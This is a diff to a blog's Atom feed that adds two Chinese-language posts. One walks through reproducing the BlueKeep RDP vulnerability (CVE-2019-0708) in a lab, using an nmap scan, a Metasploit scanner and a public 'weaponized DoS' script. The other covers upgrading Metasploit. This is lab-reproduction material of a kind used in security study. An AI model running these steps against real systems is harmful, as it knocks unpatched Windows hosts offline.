@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-09-07T07:27:25.862Z</updated>
+  <updated>2019-09-07T08:23:46.055Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,58 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>cve-2019-0708漏洞复现</title>
+    <link href="http://yoursite.com/2019/09/07/cve-2019-0708/"/>
+    <id>http://yoursite.com/2019/09/07/cve-2019-0708/</id>
+    <published>2019-09-07T12:29:32.000Z</published>
+    <updated>2019-09-07T08:23:46.055Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞的影响"><a href="#漏洞的影响" class="headerlink" title="漏洞的影响"></a>漏洞的影响</h1><p>漏洞涉及的操作系统win2003，xp，win7，win2008</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>kali：192.168.56.144<br>win7：192.168.56.132</p><h1 id="进行扫描"><a href="#进行扫描" class="headerlink" title="进行扫描"></a>进行扫描</h1><p>nmap -sS 192.168.56.132<br>此漏洞开启的前提是3389开放<br>这里运行msf扫描，注意msf必须升级msf5(没有升级请看上一篇文章）<br>进入msf<br>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep<br>set rhosts 192.168.56.132<br>run</p><h1 id="涉及"><a href="#涉及" class="headerlink" title="涉及"></a>涉及</h1><p>看到出现 The target is vulnerable<br>证明存在漏洞</p><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>git clone <a href="https://github.com/Ekultek/BlueKeep" target="_blank" rel="noopener">https://github.com/Ekultek/BlueKeep</a><br>cd BlueKeep<br>pip install -r requirements.txt<br> ./setup.sh<br>顺利安装，进行攻击<br> $sudo python bluekeep_weaponized_dos.py  -i 192.168.56.132<br>瞬间就挂了，证明漏洞还是严重尽快打补丁吧</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;漏洞的影响&quot;&gt;&lt;a href=&quot;#漏洞的影响&quot; class=&quot;headerlink&quot; title=&quot;漏洞的影响&quot;&gt;&lt;/a&gt;漏洞的影响&lt;/h1&gt;&lt;p&gt;漏洞涉及的操作系统win2003，xp，win7，win2008&lt;/p&gt;
+&lt;h1 id=&quot;实验环境&quot;&gt;&lt;a href
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>msf升级msf5</title>
+    <link href="http://yoursite.com/2019/09/07/msf%E5%8D%87%E7%BA%A7/"/>
+    <id>http://yoursite.com/2019/09/07/msf升级/</id>
+    <published>2019-09-07T09:29:32.000Z</published>
+    <updated>2019-09-07T08:14:01.898Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="kali更新msf5"><a href="#kali更新msf5" class="headerlink" title="kali更新msf5"></a>kali更新msf5</h1><p>老的msf找不到最新的漏洞无奈，只好去升级了</p><h1 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h1><p>apt remove metasploit-framework<br>卸载原来的<br>apt-get install metasploit-framework<br>重新安装最新版本</p><h1 id="报错提示"><a href="#报错提示" class="headerlink" title="报错提示"></a>报错提示</h1><p>卸载遇见无法卸载<br>无法获得锁 /var/cache/apt/archives/lock - open (11: 资源暂时不可用)<br>无法对目录 /var/cache/apt/archives/ 加锁<br>强制卸载<br>rm /var/cache/apt/archives/lock</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;kali更新msf5&quot;&gt;&lt;a href=&quot;#kali更新msf5&quot; class=&quot;headerlink&quot; title=&quot;kali更新msf5&quot;&gt;&lt;/a&gt;kali更新msf5&lt;/h1&gt;&lt;p&gt;老的msf找不到最新的漏洞无奈，只好去升级了&lt;/p&gt;
+&lt;h1 id=&quot;升级&quot;
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>John the ripper</title>
